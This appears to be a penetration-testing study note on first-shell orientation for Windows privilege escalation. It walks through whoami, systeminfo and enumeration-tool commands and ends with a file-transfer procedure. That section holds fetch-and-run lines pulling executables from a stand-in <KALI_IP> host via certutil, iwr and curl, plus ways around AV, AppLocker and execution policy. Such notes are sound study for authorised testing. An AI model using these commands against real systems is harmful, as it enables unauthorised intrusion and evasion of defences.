Answer four questions the instant you land a shell: **who am I, what can this process do, what host is this, and what privileged activity can I observe?** Every route downstream branches off these answers. This note also holds the shared **file-transfer** procedure the other notes link to.

## Goal
Build situational awareness fast and pick a route - without trusting any single tool.

## Tips
Read native output first; it decides your route. Run the sweep in ~30–60 seconds, then kick off winPEAS as a gap-check while you interpret. Overall status `[T]` (the orientation sweep was not run on the one Windows box in this vault); individually grounded facts are marked `[BT]` inline.

Checklist:
- [ ] `whoami` - SYSTEM already? (stop) · service identity? (→ [[02_token_privileges]])
- [ ] `whoami /priv` - any dangerous privilege listed? → [[02_token_privileges]]
- [ ] `whoami /groups` - Administrators / Backup Operators / RDP / WinRM?
- [ ] `systeminfo` - OS **build number** + architecture recorded?
- [ ] services, processes, installed software, listening ports mapped?

# Commands

### Step 1: first-shell sweep (cmd.exe)
```batch
whoami                                  :: MACHINE\user - who + which host
whoami /priv                            :: assigned token privileges (no Linux equivalent)
whoami /groups                          :: group memberships + integrity level line
hostname                                :: host role hint (WEB / SQL / DC)
systeminfo                              :: OS name, build number, architecture
set                                     :: environment variables (may hold secrets / paths)
```

### Step 2: same sweep (PowerShell)
```powershell
whoami /all                             # identity, groups, privileges in one shot
Get-CimInstance Win32_OperatingSystem | Select Caption,Version,BuildNumber,OSArchitecture
tasklist /v                             # processes + owning user (spot SYSTEM / admin apps)
Get-CimInstance win32_service | Select Name,State,StartName,PathName   # services + accounts
netstat -ano                            # listening ports + PID (loopback = internal surface)
```

`sc` trap: in PowerShell `sc` is an alias for `Set-Content`. Always type `sc.exe` for Service Control Manager commands (used in [[03_services]]).

## Identity decision table

| `whoami` shows                                   | Meaning                                                                 | Next                                                |
| ------------------------------------------------ | ----------------------------------------------------------------------- | --------------------------------------------------- |
| `NT AUTHORITY\SYSTEM`                            | privileged SYSTEM identity - **done**                                   | collect proof, stop                                 |
| `NT AUTHORITY\LOCAL SERVICE` / `NETWORK SERVICE` | limited service identity - but its token often exposes `SeImpersonate`  | [[02_token_privileges]]                             |
| `IIS APPPOOL\<pool>` / `NT AUTHORITY\IUSR`       | IIS worker - you came in via the web app; usually holds `SeImpersonate` | [[02_token_privileges]]                             |
| `<HOST>\<serviceuser>` (e.g. `svc_sql`)          | service account - entry context, not automatic SYSTEM                   | [[02_token_privileges]] / [[05_stored_credentials]] |
| `<HOST>\<human>`                                 | normal user                                                             | work the whole sweep                                |

`NT AUTHORITY\…` names an **authority namespace, not a privilege rank** - only `NT AUTHORITY\SYSTEM` is SYSTEM. An RCE runs in the **exploited service's** security context, so confirm your identity with your own `whoami` - never trust the exploit or another person. [BT]

## Integrity & UAC (field notes)
- Integrity levels: Untrusted < Low < **Medium** (default user) < High (elevated) < System. `whoami /groups` prints a `Mandatory Label\… Mandatory Level` line.
- **Administrators membership ≠ high integrity.** UAC gives admins a filtered (medium) token by default; modifying system files or protected keys needs a High-integrity ("elevated") process. So "I'm in Administrators" means *elevate*, not *done* → decision branch in [[09_uac]] (standard users are **not** routed there).

## OS build, architecture & the WOW64 trap
```batch
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
- Decode the **build number**, not the marketing name, to judge kernel-exploit exposure → [[08_kernel_exploits]].
- Architecture trap: a 32-bit (WOW64) process on 64-bit Windows reports `%PROCESSOR_ARCHITECTURE%` = `x86`. Confirm the real host architecture before choosing payload bitness:
```powershell
$env:PROCESSOR_ARCHITECTURE      # this process (x86 inside a 32-bit shell)
$env:PROCESSOR_ARCHITEW6432      # set only inside a 32-bit proc on 64-bit Windows -> AMD64
[Environment]::Is64BitOperatingSystem
```
Match uploaded `.exe` / `.dll` bitness to the **host**, not the shell. `systeminfo` "System Type" is a reliable cross-check.

## Users, groups & installed software (only as deep as needed)
```powershell
Get-LocalUser                                   # local users (find admin / backup accounts)
Get-LocalGroupMember Administrators             # who is already admin
net user <user>                                 # a single user's group memberships
# installed software - wmic product is INCOMPLETE (see note); prefer these:
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName,DisplayVersion
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName,DisplayVersion
Get-CimInstance Win32_Product | Select Name,Version   # MSI-only; slow; use as a supplement
dir "C:\Program Files" ; dir "C:\Program Files (x86)"
```
Keep domain enumeration out - this note is local privesc only. Map third-party product versions to public exploits ([[08_kernel_exploits]] covers OS/kernel; installed-app exploits follow the [[public_exploit_research]] workflow — evidence table, source-order research, prerequisite gate, PoC review).

`wmic product` warning: it lists **only MSI-installed** software, is deprecated and frequently absent on modern builds, is slow, and can trigger MSI self-repair / consistency checks. Prefer the uninstall registry keys and Program Files inspection.

Installed third-party apps aren't just exploit targets — their data dirs (`%APPDATA%`, `%LOCALAPPDATA%`, `C:\ProgramData`) often store credentials. Category-based credential-store discovery → [[05_stored_credentials]] Case 4.

## Automated enumeration - roles (run *after* the manual baseline)

| Tool | Role | Caveat |
|---|---|---|
| [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) | broad automated gap-check | leads, not proof; misses findings and can misreport (e.g. wrong OS) |
| [Seatbelt](https://github.com/GhostPack/Seatbelt) | targeted host survey / artifact collection | run the checks relevant to your hypothesis |
| [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) / [SharpUp](https://github.com/GhostPack/SharpUp) | privesc-misconfig enumeration | every finding needs manual confirmation; **not** a privilege enabler |
| [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) | effective access on files, dirs, services, registry keys, processes | use the older CLI build with `/accepteula` |

Interactive logon matters: over WinRM or a bind shell, `Get-CimInstance` / `Get-Service` can return "Access denied" for services as a non-admin; an RDP (interactive) logon avoids this.

## File transfer - Kali to Windows
Tool-dependent notes link here instead of repeating this. Serve on Kali, pull from Windows, **verify**, then run.

### Serve (Kali)
```bash
python3 -m http.server 80                       # HTTP; use 80/443 to survive egress filtering
impacket-smbserver share "$(pwd)" -smb2support  # SMB fallback when HTTP egress is blocked
```

### Download (Windows)
```powershell
iwr -Uri http://<KALI_IP>/<TOOL>.exe -OutFile "$env:TEMP\<TOOL>.exe"    # PowerShell
```
```batch
certutil -urlcache -split -f http://<KALI_IP>/<TOOL>.exe %TEMP%\<TOOL>.exe   :: LOLBAS
curl.exe -o %TEMP%\<TOOL>.exe http://<KALI_IP>/<TOOL>.exe                     :: built-in curl
copy \\<KALI_IP>\share\<TOOL>.exe %TEMP%\<TOOL>.exe                           :: SMB (UNC)
```

### Destinations (verify write access first with `icacls`)
`%TEMP%` · the current user's profile / Downloads · `C:\Users\Public` · `C:\Windows\Temp`. Do **not** assume `C:\` root or `System32` are writable.

### Verify arrival & integrity
```powershell
Get-Item "$env:TEMP\<TOOL>.exe" | Select Length          # size sane (not a 0-byte / HTML error)?
Get-FileHash "$env:TEMP\<TOOL>.exe"                       # compare to `sha256sum <TOOL>.exe` on Kali
```
```batch
certutil -hashfile %TEMP%\<TOOL>.exe SHA256
```

### If transfer or execution fails - check in this order
1. wrong path / no write ACL on the destination → pick another destination, re-check with `icacls`
2. wrong URL or filename → read the Kali server log
3. Kali listener binding / route → is `http.server` bound to the interface `<TARGET>` can reach?
4. egress restriction → switch to 80/443, or SMB
5. SMB blocked / auth required → fall back to HTTP
6. **AV / Defender quarantine** - the file downloads then disappears (winPEAS, potatoes, mimikatz are flagged) → try a less-flagged tool or a permitted alternative
7. AppLocker / WDAC / PowerShell execution policy → run from an allowed directory, `powershell -ep bypass`, or a LOLBAS
8. missing runtime (.NET) or **architecture mismatch** → match host arch (see WOW64 trap)

A successful **download does not prove execution will succeed** - AV, AppLocker, runtime, and bitness can still block the run. Confirm with `whoami` after the payload fires.

[LOLBAS](https://lolbas-project.github.io/) - Microsoft-signed built-in binaries for download / execute / bypass (a living-off-the-land reference, **not** a privilege-escalation finder).

## Windows ↔ Linux quick map
| Windows | Linux analogue |
|---|---|
| Windows service | daemon / systemd service |
| Scheduled task | cron |
| `HKLM` (machine hive) | `/etc` (machine-wide config) |
| `HKCU` (user hive) | dotfiles (per-user config) |
| token privileges (`whoami /priv`) | *no exact equivalent* |
